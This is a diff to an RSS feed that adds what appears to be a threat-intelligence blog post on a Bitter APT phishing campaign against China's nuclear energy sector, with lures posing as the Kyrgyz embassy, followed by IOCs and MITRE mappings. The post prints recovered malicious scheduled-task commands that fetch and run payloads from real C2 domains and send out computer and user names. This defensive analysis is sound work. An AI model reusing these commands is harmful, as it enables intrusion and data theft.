@@ -372,4 +372,329 @@ track these shifts in real time. We encourage the community to remain
 proactive. These are not theoretical techniques; they are actively used in the
 wild, and we expect their adoption to increase.&lt;/p&gt;
 &lt;p&gt;Phishing isn’t going away, but with the right tools, analysis depth, and
-research collaboration, we can stay ahead of threats designed to go unnoticed.&lt;/p&gt;</description></item></channel></rss>
+research collaboration, we can stay ahead of threats designed to go unnoticed.&lt;/p&gt;</description></item><item><title>Phishing Campaign Targets Chinese Nuclear Energy Industry</title><link>https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/</link><pubDate>Fri, 24 Mar 2023 00:00:00 +0000</pubDate><guid>https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/</guid><description>
+&lt;p&gt;Intezer has been tracking activity targeting the energy sector and noted a
+campaign with techniques that align with those of
+&lt;a href="https://analyze.intezer.com/families/3b992ec8-b6b1-4ea4-a958-b5fca45f31bd?tab=detect"target="_blank" rel="noopener"&gt;Bitter APT&lt;/a&gt;,
+operating in the Asia-Pacific region.&lt;/p&gt;
+&lt;p&gt;We have made the connection to Bitter APT through tactics, techniques, and
+procedures (TTPs) that have been observed in other publications, such as the
+use of Microsoft Office exploits through
+&lt;a href="https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/"target="_blank" rel="noopener"&gt;Excel files&lt;/a&gt;,
+and the use of CHM and
+&lt;a href="https://www.antiy.cn/research/notice&amp;amp;report/research_report/20210705.html"target="_blank" rel="noopener"&gt;Windows Installer (MSI) files&lt;/a&gt;.
+Bitter APT is a South Asian threat group that commonly targets energy and
+government sectors; they have been
+&lt;a href="https://attack.mitre.org/groups/G1002/"target="_blank" rel="noopener"&gt;known to target&lt;/a&gt; Pakistan, China,
+Bangladesh, and Saudi Arabia.&lt;/p&gt;
+&lt;p&gt;Bitter APT are continuing to target organizations in China in an espionage
+campaign, as our here research shows. For some of the payloads we have
+corresponding phishing emails that were used as lures to deliver the files,
+allowing analysis of the social engineering techniques used. &lt;strong&gt;We have noted
+updates to the first-stage payloads used, with new layers of obfuscation to
+hinder analysis and additional decoys used for social engineering&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;Analysis of Phishing Lures and Payloads&lt;span class="hx:absolute hx:-mt-20" id="analysis-of-phishing-lures-and-payloads"&gt;&lt;/span&gt;
+&lt;a href="#analysis-of-phishing-lures-and-payloads" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We identified seven emails pretending to be from the Embassy of Kyrgyzstan,
+being sent to recipients in the nuclear energy industry in China. In some
+emails, people and entities in academia are also targeted, also related to
+nuclear energy. The phishing emails contain a lure that invites the recipients
+to join conferences on subjects that are relevant to them. The lures are
+designed to socially engineer the recipient to download and open an attached
+RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel
+payload. This activity appears to be a continuation of the tactics and campaign
+that Bitter APT have been using since
+&lt;a href="https://www.antiy.cn/research/notice&amp;amp;report/research_report/20210705.html"target="_blank" rel="noopener"&gt;at least 2021&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig1.png" title="Figure 1: Attack flow described in this research" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 1: Attack flow described in this research&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Social Engineering with Phishing Emails&lt;span class="hx:absolute hx:-mt-20" id="social-engineering-with-phishing-emails"&gt;&lt;/span&gt;
+&lt;a href="#social-engineering-with-phishing-emails" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The emails contain a number of social engineering techniques. The name and
+email address used to send the phishing emails is crafted to look like it is
+coming from an &amp;ldquo;Embassy in Beijing.&amp;rdquo; A free email provider is used, therefore
+domain reputation checks will not be useful.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig2.png" title="Figure 2: Name crafted to appear as communication from an embassy" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 2: Name crafted to appear as communication from an embassy&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The email is signed off with the name and details of an actual attaché of the
+Kyrgyz embassy in China. If the recipient were to use a search engine to check
+for this employee, they would easily be able to find corroborating information
+from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan,
+adding to the supposed legitimacy of the email. This is presumably also how the
+malicious actor was able to get information in order to craft the lure.&lt;/p&gt;
+&lt;p&gt;The email subject and body use terms and themes that would be familiar with the
+recipients in governmental and energy sectors, such as International Atomic
+Energy Agency (IAEA), China Institute of International Studies (CIIS),
+strategic alliances, and nuclear doctrines.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig3.png" title="Figure 3: Email body lure with nuclear themes" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 3: Email body lure with nuclear themes&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Malicious Payloads via CHM and Microsoft Excel Files&lt;span class="hx:absolute hx:-mt-20" id="malicious-payloads-via-chm-and-microsoft-excel-files"&gt;&lt;/span&gt;
+&lt;a href="#malicious-payloads-via-chm-and-microsoft-excel-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Multiple payloads have been observed being delivered. Either CHM files, or
+Microsoft Excel files with Equation Editor exploits. These payloads are
+compressed inside RAR files, this helps avoid static analysis techniques that
+do not decompress the files first. The purpose of the payloads are to create
+persistence and download further malware payloads. We were not able to get
+further additional payloads from the command and control (C2) servers, but in
+some instances were able to get the file names of next stages from active C2s.&lt;/p&gt;
+&lt;h2&gt;Malicious Microsoft Excel Files&lt;span class="hx:absolute hx:-mt-20" id="malicious-microsoft-excel-files"&gt;&lt;/span&gt;
+&lt;a href="#malicious-microsoft-excel-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The Excel
+&lt;a href="https://analyze.intezer.com/files/07504fcef717e6b74ed381e94eab5a9140171572b5572cda87b275e3873c8a88"target="_blank" rel="noopener"&gt;payloads&lt;/a&gt;
+simply contain an Equation Editor exploit that creates two different
+&lt;a href="https://intezer.com/blog/incident-response/infected-endpoint-scan-result/#:~:text=has%20created%20a-,scheduled%20task,-%2C%20which%20we%20can"target="_blank" rel="noopener"&gt;scheduled tasks&lt;/a&gt;.
+There is no decoy in the document. One scheduled task (shown below) runs every
+15 minutes, to download a next stage EXE payload using cURL, also sending the
+actor the name of the infected machine. These tactics have been observed being
+used by Bitter APT in
+&lt;a href="https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/"target="_blank" rel="noopener"&gt;2021/2022&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="images/fig4" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 4: Scheduled task&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The second scheduled task created attempts to execute the payload downloaded by
+the other task:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h2&gt;CHM Files&lt;span class="hx:absolute hx:-mt-20" id="chm-files"&gt;&lt;/span&gt;
+&lt;a href="#chm-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The more common payloads contained within the RAR files are Microsoft Compiled
+HTML Help (CHM) files. These can be used to simply execute arbitrary code, in
+these cases, they are also used to create scheduled tasks for persistence and
+downloading of the next stage. We have noted multiple versions of these CHM
+payloads. CHM payloads are useful for the actor as it requires a low amount of
+user interaction, it does not require a vulnerable version of Microsoft Office
+installed like the Excel files, and it also uses LZX compression that will
+bypass static malware analysis solutions that do not decompress the file.&lt;/p&gt;
+&lt;p&gt;The
+&lt;a href="https://analyze.intezer.com/files/06b4c1f46845cee123b2200324a3ebb7fdbea8e2c6ef4135e3f943bd546a2431/behavior"target="_blank" rel="noopener"&gt;first version&lt;/a&gt;
+of the CHM file will create a scheduled task that will use the living off the
+land binary
+&lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"target="_blank" rel="noopener"&gt;msiexec&lt;/a&gt; to execute
+a remote MSI payload from the C2. String concatenation is used to break up the
+string for obfuscation. The computer name and the username is also sent to the
+C2.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc minute /mo 15 /tn AdobeUpdater /tr &amp;#34;%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.]com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart&amp;#34; /ft&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;We did not fetch any additional payloads from the C2, but we were served empty
+MSI files, allowing us to discover the names of the next stage payloads.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="images/fig5" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 5: Empty payloads served from different C2 servers&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This may allow the actor to examine the server logs of beaconing infected
+machines before deciding whether to swap out the empty file with an actual
+payload if the target looks promising enough, thus protecting the next stage of
+the attack. Bitter APT do not appear to change their tactics too much,
+therefore we can assume that the payloads will be similar to those
+&lt;a href="https://www.antiy.cn/research/notice&amp;amp;report/research_report/20210705.html"target="_blank" rel="noopener"&gt;observed&lt;/a&gt;
+in 2021, executing a downloader module that can be served with plugins such as
+a keylogger, remote access tool, file stealer, or browser credential stealer.&lt;/p&gt;
+&lt;p&gt;The
+&lt;a href="https://analyze.intezer.com/files/ded0635c5ef9c3d63543abc36a69b1176875dba84ca005999986bd655da3a446/genetic-analysis"target="_blank" rel="noopener"&gt;second version&lt;/a&gt;
+of the CHM payload abstracts the same activity through an encoded PowerShell
+command stage, obfuscating the activity further than just simple string
+concatenation.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig6.png" title="Figure 6: Encoded PowerShell command in version 2 of the CHM files" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 6: Encoded PowerShell command in version 2 of the CHM files&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The decoded command is the following:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;It is evident that the C2 controllers have been updated also as now only the
+computer name is sent to the C2 and not the username. What is interesting about
+the next version is that it now contains a decoy picture when opened:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig7.png" title="Figure 7: Decoy picture" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 7: Decoy picture&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The decoy appears to reference the United Front Work Department of the Central
+Committee of the Chinese Communist Party. The following is a machine translated
+version of the same picture for reference (please note that the translation
+will not be fully accurate and should be used for reference purposes only):&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://intezer.github.io/community-intelligence/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig8.jpg" title="Figure 8: Machine translated version of the decoy" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 8: Machine translated version of the decoy&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;span class="hx:absolute hx:-mt-20" id="conclusion"&gt;&lt;/span&gt;
+&lt;a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Bitter APT have been conducting espionage campaigns for years using many
+tactics, including phishing, to achieve their goals. It is advised that
+entities in government, energy, and engineering especially those in the
+Asia-Pacific region should remain vigilant when receiving emails, especially
+those claiming to be from other diplomatic entities. Always verify that the
+sender is trusted and understand that even if it claims to be from a particular
+person, it might not be. None of the social engineering techniques used are
+novel and it is imperative that employees of companies should have a good
+standard of security awareness about phishing emails, so employees can report
+phishing emails for investigation.&lt;/p&gt;
+&lt;p&gt;Always take care when handling attachments, and never open CHM files as they
+are antiquated and not commonly used for legitimate purposes currently.&lt;/p&gt;
+&lt;h2&gt;Indicators of Compromise&lt;span class="hx:absolute hx:-mt-20" id="indicators-of-compromise"&gt;&lt;/span&gt;
+&lt;a href="#indicators-of-compromise" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;File Hashes (SHA256)&lt;span class="hx:absolute hx:-mt-20" id="file-hashes-sha256"&gt;&lt;/span&gt;
+&lt;a href="#file-hashes-sha256" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;5f663f15701f429f17cc309d10ca03ee00fd20f733220cc9d2502eff5d0cd1a1 (Email)
+eb7aebded5549f8b006e19052e0d03dc9095c75a800897ff14ef872f18c8650e (Email)
+cac239cf09a6a5bc1f9a3b29141336773c957d570212b97f73e13122fe032179 (Email)
+8d2f6b0d7a6a06708593cc64d9187878ea9d2cc3ae9a657926aa2a8522b93f74 (Email)
+33905e2db3775d2e8e75c61e678d193ac2bab5b5a89d798effbceb9ab202d799 (Email)
+5c85194ade91736a12b1eeeb13baa0b0da88c5085ca0530c4f1d86342170b3bc (Email)
+ef4fb1dc3d1ca5ea8a88cd94596722b93524f928d87dff0d451d44da4e9181f1 (Email)
+b2566755235c1df3371a7650d94339e839efaa85279656aa9ab4dc4f2d94bbfa (RAR)
+33a20950e7f4b2191706ddf9089f1e91be1e5384cca00a57cf6b58056f70c96b (RAR)
+7e7e90b076ef3ea4ef8ed4ef14fb599a2acb15d9ce00c78e5949186da1e355cf (RAR)
+07504fcef717e6b74ed381e94eab5a9140171572b5572cda87b275e3873c8a88 (XLS)
+06b4c1f46845cee123b2200324a3ebb7fdbea8e2c6ef4135e3f943bd546a2431 (CHM)
+ded0635c5ef9c3d63543abc36a69b1176875dba84ca005999986bd655da3a446 (CHM)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Network&lt;span class="hx:absolute hx:-mt-20" id="network"&gt;&lt;/span&gt;
+&lt;a href="#network" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;qwavemediaservice[.]net
+mirzadihatti[.]com
+coauthcn[.]com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Mitre ATT&amp;amp;CK&lt;span class="hx:absolute hx:-mt-20" id="mitre-attck"&gt;&lt;/span&gt;
+&lt;a href="#mitre-attck" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Tactic&lt;/th&gt;
+&lt;th&gt;Technique&lt;/th&gt;
+&lt;th&gt;ID&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Reconnaissance&lt;/td&gt;
+&lt;td&gt;Email Addresses&lt;/td&gt;
+&lt;td&gt;T1589.002&lt;/td&gt;
+&lt;td&gt;The actor gathers target email addresses to target with spearphishing emails&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Initial Access&lt;/td&gt;
+&lt;td&gt;Spearphishing Attachment&lt;/td&gt;
+&lt;td&gt;T1566.001&lt;/td&gt;
+&lt;td&gt;Spearphishing is used to deliver RAR attachments&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Execution&lt;/td&gt;
+&lt;td&gt;PowerShell&lt;/td&gt;
+&lt;td&gt;T1059.001&lt;/td&gt;
+&lt;td&gt;Encoded PowerShell is used by CHM payload&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Execution&lt;/td&gt;
+&lt;td&gt;Exploitation for Client Execution&lt;/td&gt;
+&lt;td&gt;T1203&lt;/td&gt;
+&lt;td&gt;Microsoft Office exploits are used to execute code&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Persistence&lt;/td&gt;
+&lt;td&gt;Scheduled Task&lt;/td&gt;
+&lt;td&gt;T1053.005&lt;/td&gt;
+&lt;td&gt;Scheduled Tasks used for both execution and persistence&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Defense Evasion&lt;/td&gt;
+&lt;td&gt;Msiexec&lt;/td&gt;
+&lt;td&gt;T1218.007&lt;/td&gt;
+&lt;td&gt;Msiexec is used to launch next stage payloads&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Defense Evasion&lt;/td&gt;
+&lt;td&gt;Compiled HTML File&lt;/td&gt;
+&lt;td&gt;T1218.001&lt;/td&gt;
+&lt;td&gt;CHM files are used to deliver payloads&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Defense Evasion&lt;/td&gt;
+&lt;td&gt;Masquerading&lt;/td&gt;
+&lt;td&gt;T1036&lt;/td&gt;
+&lt;td&gt;Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg. Adobe Updater)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Discovery&lt;/td&gt;
+&lt;td&gt;System Information Discovery&lt;/td&gt;
+&lt;td&gt;T1082&lt;/td&gt;
+&lt;td&gt;First stage payloads fetch Computer and User names&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Command and Control&lt;/td&gt;
+&lt;td&gt;Web Protocols&lt;/td&gt;
+&lt;td&gt;T1071.001&lt;/td&gt;
+&lt;td&gt;HTTPS is used for C2 communication&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Command and Control&lt;/td&gt;
+&lt;td&gt;Exfiltration Over C2 Channel&lt;/td&gt;
+&lt;td&gt;T1041&lt;/td&gt;
+&lt;td&gt;Data can be exfiltrated&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;</description></item></channel></rss>
